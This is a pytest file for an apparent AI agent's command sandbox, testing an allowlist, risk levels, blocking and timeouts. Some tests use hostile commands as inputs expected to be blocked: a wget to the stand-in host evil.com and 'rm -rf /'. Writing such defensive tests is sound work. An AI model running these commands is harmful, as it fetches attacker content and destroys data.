"""Tests for command sandbox."""

from __future__ import annotations

from unittest.mock import AsyncMock, patch

import pytest

from argus_agent.actions.sandbox import COMMAND_ALLOWLIST, CommandResult, CommandSandbox
from argus_agent.tools.base import ToolRisk


class TestCommandSandbox:
    def setup_method(self):
        self.sandbox = CommandSandbox()

    def test_validate_allowed_read_only(self):
        allowed, risk = self.sandbox.validate_command(["df", "-h"])
        assert allowed is True
        assert risk == ToolRisk.READ_ONLY

    def test_validate_allowed_medium(self):
        allowed, risk = self.sandbox.validate_command(["systemctl", "restart", "nginx"])
        assert allowed is True
        assert risk == ToolRisk.MEDIUM

    def test_validate_allowed_high(self):
        allowed, risk = self.sandbox.validate_command(["kill", "-9", "12345"])
        assert allowed is True
        assert risk == ToolRisk.HIGH

    def test_validate_blocked_not_in_allowlist(self):
        allowed, risk = self.sandbox.validate_command(["wget", "http://evil.com"])
        assert allowed is False
        assert risk == ToolRisk.CRITICAL

    def test_validate_blocklist_rm_rf_root(self):
        allowed, risk = self.sandbox.validate_command(["rm", "-rf", "/"])
        assert allowed is False
        assert risk == ToolRisk.CRITICAL

    def test_custom_allowlist(self):
        custom = {"my-tool *": ToolRisk.LOW}
        sandbox = CommandSandbox(allowlist=custom)
        allowed, risk = sandbox.validate_command(["my-tool", "arg1"])
        assert allowed is True
        assert risk == ToolRisk.LOW

    @pytest.mark.asyncio
    async def test_execute_blocked_command(self):
        result = await self.sandbox.execute(["wget", "http://evil.com"])
        assert result.exit_code == -1
        assert "blocked" in result.stderr.lower()

    @pytest.mark.asyncio
    async def test_execute_success(self):
        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(return_value=(b"output", b""))
        mock_proc.returncode = 0
        mock_proc.kill = AsyncMock()

        with patch("asyncio.create_subprocess_exec", return_value=mock_proc):
            result = await self.sandbox.execute(["echo", "hello"])
            assert result.exit_code == 0
            assert result.stdout == "output"

    @pytest.mark.asyncio
    async def test_execute_timeout(self):
        mock_proc = AsyncMock()
        mock_proc.communicate = AsyncMock(side_effect=TimeoutError())
        mock_proc.kill = AsyncMock()

        with patch("asyncio.create_subprocess_exec", return_value=mock_proc):
            with patch("asyncio.wait_for", side_effect=TimeoutError()):
                result = await self.sandbox.execute(["echo", "hello"], timeout=1)
                assert result.exit_code == -1
                assert "timed out" in result.stderr.lower()

    def test_allowlist_has_entries(self):
        assert len(COMMAND_ALLOWLIST) > 10

    def test_command_result_dataclass(self):
        r = CommandResult(exit_code=0, stdout="ok", stderr="", duration_ms=100)
        assert r.exit_code == 0
        assert r.duration_ms == 100
